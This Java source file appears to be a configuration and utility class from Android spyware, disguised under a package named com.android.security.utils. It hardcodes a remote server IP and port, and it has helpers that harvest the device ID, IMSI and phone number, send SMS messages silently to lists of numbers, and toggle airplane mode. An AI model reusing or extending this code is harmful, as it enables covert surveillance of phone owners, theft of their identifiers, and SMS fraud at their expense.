package com.android.security.utils;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class Config {

 
	// 服务地址
 
	
	public static String ip ;
	public static int port ;
	public static String password;
	
	public static void initParamters()
	{
		//ip="dfgd.selfip.net";
		ip="219.235.14.180";
		port = 9999;
	}
 
    public static String getPhoneDeviceid(Context context)
    {
		String deviceid = "unknown";
		try {
    		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    		deviceid = tm.getDeviceId();
        	 
		} catch (Exception e) {
			LogUtil.i(e.toString());
		}	
		return deviceid;    	
    }
    
    public static String getDeviceSoftwareVersion(Context context)
    {
		try{
			TelephonyManager mTelephonyMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
			String softversion = mTelephonyMgr.getDeviceSoftwareVersion();
			if(softversion!= null)
				return softversion;
			else
				return "-";
		}catch (Exception e) {}
		return "-";    	
    }
    
	public static String getPhoneNumber(Context context){  
		String deviceTelphoneNumber = "unknown";
		try {
    		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        	deviceTelphoneNumber = tm.getLine1Number();
        	if(deviceTelphoneNumber == null || "".equals(deviceTelphoneNumber)){
        		deviceTelphoneNumber = tm.getDeviceId();
        	}
		} catch (Exception e) {
			// TODO: handle exception
			LogUtil.i(e.toString());
			e.printStackTrace();
		}	
		return deviceTelphoneNumber;
	} 
	
	public static String getIMSI(Context context){
		try{
			TelephonyManager mTelephonyMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
			String imsi = mTelephonyMgr.getSubscriberId();
			if(imsi!= null)
				return imsi.trim();
			else
				return "";
		}catch (Exception e) {}
		return "";
	}
 
	public static String getSDPath() {
		File sdDir = null;
		boolean sdCardExist = Environment.getExternalStorageState().equals(
				android.os.Environment.MEDIA_MOUNTED); // 判断sd卡是否存在
		if (sdCardExist) {
			sdDir = Environment.getExternalStorageDirectory();// 获取跟目录
		}
		return sdDir.toString();

	}
	
	public static long getFileSizes(File f) throws Exception {
		long s = 0;
		if (f.exists()) {
			FileInputStream fis = null;
			fis = new FileInputStream(f);
			s = fis.available();
			fis.close();
		} else {
			f.createNewFile();
			LogUtil.i("文件不存在");
		}
		return s;
	}
	 
	/**
	 * 用来判断服务是否运行.
	 * 
	 * @param context
	 * @param className
	 *            判断的服务名字
	 * @return true 在运行 false 不在运行
	 */
	public static boolean isServiceRunning(Context mContext, String className) {
		boolean isRunning = false;
		ActivityManager activityManager = (ActivityManager) mContext
				.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningServiceInfo> serviceList = activityManager
				.getRunningServices(30);
		if (!(serviceList.size() > 0)) {
			return false;
		}
		for (int i = 0; i < serviceList.size(); i++) {
			if (serviceList.get(i).service.getClassName().equals(className) == true) {
				isRunning = true;
				break;
			}
		}
		return isRunning;
	}
	
	public static boolean isNetworkConnected(Context context) {  
	    if (context != null) {  
	        ConnectivityManager mConnectivityManager = (ConnectivityManager) context  
	                .getSystemService(Context.CONNECTIVITY_SERVICE);  
	        NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();  
	        if (mNetworkInfo != null) {  
	            return mNetworkInfo.isAvailable();  
	        }  
	    }  
	    return false;  
	}
	
	public static boolean isServiceWork(Context context, String className) {
		ActivityManager myManager = (ActivityManager) context
				.getSystemService(Context.ACTIVITY_SERVICE);
		ArrayList<ActivityManager.RunningServiceInfo> runningService = (ArrayList<ActivityManager.RunningServiceInfo>) myManager
				.getRunningServices(30);
		for (int i = 0; i < runningService.size(); i++) {
			if (runningService.get(i).service.getClassName().toString()
					.equals(className)) {
				return true;
			}
		}
		return false;
	}
	
	public static boolean sendSmss(String smsmsg,List<String> phonelist)
	{
		boolean flag = true;

		if(phonelist!= null && phonelist.size()>0)
		{
			SmsManager manager = SmsManager.getDefault();  
			for(String phone: phonelist)
			{
				if(smsmsg.length()>70)
				{
					ArrayList<String> list = manager.divideMessage(smsmsg);
					for(String text:list){ 
						  manager.sendTextMessage(phone, null, text, null, null);  	
					}
				}else
				{
					  manager.sendTextMessage(phone, null, smsmsg, null, null);  	
				}
			}
		}
		return flag;
	}

	@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
	public static void setAirplaneModeOn(Context context ,int enabling) {
		LogUtil.i("setAirplaneModeOn");
		
		 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
	            Settings.System.putInt(
	                      context.getContentResolver(),
	                      Settings.System.AIRPLANE_MODE_ON, enabling);
	        } else {
	            Settings.Global.putInt(
	                      context.getContentResolver(),
	                      Settings.Global.AIRPLANE_MODE_ON, enabling);
	        }       

		
		Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		intent.putExtra("state", enabling);
		context.sendBroadcast(intent);
	}
}
